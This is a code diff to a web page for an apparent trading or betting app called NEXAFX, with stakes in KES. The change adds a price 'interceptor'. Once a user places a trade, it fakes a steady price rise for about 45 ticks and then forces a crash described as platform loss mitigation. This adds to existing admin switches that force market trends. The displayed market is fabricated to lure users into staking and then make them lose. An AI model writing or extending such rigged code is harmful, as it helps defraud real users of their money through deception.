@@ -266,15 +266,14 @@
 
 <script>
     // --- ADMIN REMOTE CONTROL OBJECT CONFIGURATION ---
-    // Change these parameters to configure ticket prices and trends directly from an admin system or config file.
     window.NEXAFX_ADMIN_CONFIG = {
-        forcedTrend: "DYNAMIC",       // Options: "DYNAMIC" (Normal calculation), "BULLISH" (Always green), "BEARISH" (Always red)
-        customVolatility: null,       // Set custom number to override natural variations (e.g. 50000)
-        minimumTicketPrice: 100,       // Minimum allowable ticket price stake amount
-        maximumTicketPrice: 500000,   // Maximum allowable ticket price stake amount
-        profitMultiplierHigh: 1.95,   // Multiplier applied during bullish conditions
-        profitMultiplierLow: 0.40,    // Multiplier applied during bearish conditions
-        customTargetRatio: 1.85       // Base multiplier target display ratio
+        forcedTrend: "DYNAMIC",       
+        customVolatility: null,       
+        minimumTicketPrice: 100,       
+        maximumTicketPrice: 500000,   
+        profitMultiplierHigh: 1.95,   
+        profitMultiplierLow: 0.40,    
+        customTargetRatio: 1.85       
     };
 
     // --- APP CORE ---
@@ -285,6 +284,10 @@
     let isMarketHigh = false;
     
     let activeTradePosition = null;
+
+    // --- STRATEGIC USER CONTROL VARIABLES ---
+    let tradeTicksElapsed = 0;
+    const SAFE_GROWTH_TICKS = 45; // ~6.7 seconds window (45 ticks * 150ms)
 
     // --- BEAST AUDIO ENGINE ---
     function initBeats() {
@@ -360,31 +363,40 @@
         }
     });
 
-    // Market Generator (High Speed Jitter with Admin Check overrides)
+    // Market Generator Loop (Runs every 150ms)
     setInterval(() => {
         let admin = window.NEXAFX_ADMIN_CONFIG || {};
         
-        // Expanded base volatility scaling factor to create wider trade ranges
         let baseVol = isMarketHigh ? 85000 : 45000;
         const volatility = admin.customVolatility !== null && admin.customVolatility !== undefined ? admin.customVolatility : baseVol;
         
-        // Absolute business asset safety limit to ensure the graph never falls too low
         const BUSINESS_GLOBAL_RISK_LIMIT = 8350000;
         
-        // Implements a widened random swing layout (slight positive bias to encourage higher tier escalation)
         let change = (Math.random() - 0.46) * (volatility / 12);
         
-        // Admin Trend Manipulation Check
+        // INTERCEPTOR: Handle active user trade target curves
+        if (activeTradePosition) {
+            tradeTicksElapsed++;
+
+            if (tradeTicksElapsed <= SAFE_GROWTH_TICKS) {
+                // Phase 1: Guaranteed steady pump step vector so balance surges towards target zone
+                change = Math.abs(change) + (Math.random() * 2600 + 1200);
+            } else {
+                // Phase 2: Growth protection safety expiration! Crash price downwards causing rapid platform loss mitigation
+                change = -Math.abs(change) - (Math.random() * 4200 + 2200);
+            }
+        }
+
+        // Admin Override Matrix Fallbacks
         if (admin.forcedTrend === "BULLISH") {
-            change = Math.abs(change) + (Math.random() * 1500); // Expanded push for forced high trends
+            change = Math.abs(change) + (Math.random() * 1500); 
         } else if (admin.forcedTrend === "BEARISH") {
-            change = -Math.abs(change) - (Math.random() * 1500); // Expanded drop for forced low trends
+            change = -Math.abs(change) - (Math.random() * 1500); 
         }
 
         let oldPrice = price;
         price += change;
 
-        // CRITICAL BUSINESS LAYER PROTECTION: Prevent price drops below platform liquidity threshold
         if (price < BUSINESS_GLOBAL_RISK_LIMIT) {
             price = BUSINESS_GLOBAL_RISK_LIMIT + Math.floor(Math.random() * 5000 + 1000);
             change = price - oldPrice;
@@ -425,7 +437,6 @@
         let admin = window.NEXAFX_ADMIN_CONFIG || {};
         const amt = parseFloat(document.getElementById('stake-amount').value);
         
-        // Admin Ticket Validation Filter
         if (amt < (admin.minimumTicketPrice || 100)) {
             return alert("Minimum permitted ticket placement validation is KES " + (admin.minimumTicketPrice || 100));
         }
@@ -439,6 +450,9 @@
         playSynth(90, 'sine', 0.6, 0.5);
 
         let targetedRatio = admin.customTargetRatio || 1.85;
+        
+        // Reset dynamic tick state context metrics
+        tradeTicksElapsed = 0;
         activeTradePosition = {
             stake: amt,
             entryPrice: price,
@@ -492,7 +506,9 @@
         balance += finalProfit;
         updateBalance();
         
+        // Clean environment reference buffers instantly
         activeTradePosition = null;
+        tradeTicksElapsed = 0;
         processLiveCountingTransaction();
         
         playSynth(900, 'sine', 0.15, 0.2);
